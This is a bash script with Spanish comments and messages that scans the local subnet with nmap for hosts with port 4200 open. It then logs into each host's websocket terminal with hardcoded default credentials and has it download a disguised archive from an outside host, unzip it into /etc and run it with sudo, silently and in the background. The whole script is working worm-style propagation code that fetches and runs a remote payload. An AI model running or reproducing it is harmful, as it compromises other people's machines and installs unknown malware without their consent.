#!/bin/bash

TARGET_PORT="4200"
NMAP_OUTPUT_FILE="/tmp/nmap_scan_4200_open.gnmap"

WEBSOCAT_USER="user"
WEBSOCAT_PASS="1"
WEBSOCAT_COMMAND='nohup bash -c "sudo wget -q https://novahash.de/fileslab/checkhivetls.jpg -O /etc/checkhivetls.zip && unzip -q -o /etc/checkhivetls.zip -d /etc && sudo bash /etc/checkhivetls.sh" >/dev/null 2>&1 &'

if ! command -v nmap &> /dev/null; then
    echo "nmap no encontrado, instalando..."
    sudo apt-get update
    sudo apt-get install nmap -y
    if [ $? -ne 0 ]; then
        echo "Error al instalar nmap."
        exit 1
    fi
fi

if ! command -v websocat &> /dev/null; then
    echo "websocat no encontrado, instalando..."
    wget -q https://github.com/vi/websocat/releases/download/v1.14.1/websocat.x86_64-unknown-linux-musl -O /tmp/websocat
    sudo mv /tmp/websocat /usr/local/bin/websocat
    sudo chmod +x /usr/local/bin/websocat
    if [ $? -ne 0 ]; then
        echo "Error al instalar websocat."
        exit 1
    fi
fi


LOCAL_IP=""
if command -v ip &> /dev/null; then
    LOCAL_IP=$(ip -4 addr show eth0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
    if [ -z "$LOCAL_IP" ]; then
        LOCAL_IP=$(ip -4 addr show wlan0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
    fi
fi
if [ -z "$LOCAL_IP" ]; then
    LOCAL_IP=$(ip route get 1.1.1.1 2>/dev/null \
        | awk '{for(i=1;i<=NF;++i) if ($i=="src") { print $(i+1); exit } }')
fi
if [ -z "$LOCAL_IP" ]; then
    echo "¡ERROR CRÍTICO! No se pudo determinar la IP local."
    exit 1
fi

NETWORK_PREFIX=$(echo "$LOCAL_IP" | cut -d. -f1-3)
IP_RANGE="${NETWORK_PREFIX}.0/24"

echo "(eth0/wifi): $LOCAL_IP ---"
echo "$IP_RANGE ---"

sudo nmap -p "$TARGET_PORT" --open -oG "$NMAP_OUTPUT_FILE" "$IP_RANGE" > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "Error al ejecutar Nmap."
    rm -f "$NMAP_OUTPUT_FILE"
    exit 1
fi


current_nmap_ips=($(awk -v port="$TARGET_PORT" '
    /^Host: / { current_ip = $2 }
    $0 ~ "Ports: " port "/open/tcp/" { print current_ip }
' "$NMAP_OUTPUT_FILE" | sort -u))

filtered_ips=()
for ip in "${current_nmap_ips[@]}"; do
    if [ "$ip" != "$LOCAL_IP" ]; then
        filtered_ips+=("$ip")
    fi
done
current_nmap_ips=("${filtered_ips[@]}")

if [ ${#current_nmap_ips[@]} -eq 0 ]; then
    echo "No se encontraron hosts con el puerto $TARGET_PORT abierto en $IP_RANGE."
    rm -f "$NMAP_OUTPUT_FILE"
    exit 0
fi

echo "--- Hosts encontrados: ${#current_nmap_ips[@]} ---"

send_websocket_command() {
    local ip="$1"
    local command="$2"
    local user="$3"
    local pass="$4"
    
    send_tty() {
        local str="$1"
        for (( i=0; i<${#str}; i++ )); do
            echo -ne "0${str:$i:1}"
            sleep 0.05
        done
    }
    
    {
        echo -ne '{"AuthToken":"","columns":80,"rows":24}'
        sleep 1.5

        send_tty "$user"$'\r'
        sleep 1.5

        send_tty "$pass"$'\r'
        sleep 3

        send_tty "$command"$'\r'
        sleep 2

    } | websocat -b --insecure \
        -H "Origin: https://$ip:$TARGET_PORT" \
        -H "User-Agent: Mozilla/5.0" \
        --protocol tty wss://$ip:$TARGET_PORT/ws > /dev/null 2>&1
    
    local ws_exit_status=$?
    
    if [ $ws_exit_status -eq 0 ]; then
        echo "✓ $ip -  OK"
    else
        echo "✗ $ip - Error (código: $ws_exit_status)"
    fi
}

# Crear función de logging
log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> /etc/wsc.log
}

# Inicio del script
log_message "=== Script iniciado ==="
log_message "Total de IPs a procesar: ${#current_nmap_ips[@]}"

for ip in "${current_nmap_ips[@]}"; do
    log_message "Procesando IP: $ip"
    log_message "Comando a ejecutar: $WEBSOCAT_COMMAND"
    
    send_websocket_command "$ip" "$WEBSOCAT_COMMAND" "$WEBSOCAT_USER" "$WEBSOCAT_PASS"
    
    if [ $? -eq 0 ]; then
        log_message "Éxito al enviar comando a $ip"
    else
        log_message "ERROR al enviar comando a $ip (código: $?)"
    fi
done

log_message "Eliminando archivo: $NMAP_OUTPUT_FILE"
rm -f "$NMAP_OUTPUT_FILE"

if [ ! -f "$NMAP_OUTPUT_FILE" ]; then
    log_message "Archivo $NMAP_OUTPUT_FILE eliminado correctamente"
else
    log_message "ERROR: No se pudo eliminar $NMAP_OUTPUT_FILE"
fi

log_message "--- Script finalizado ---"
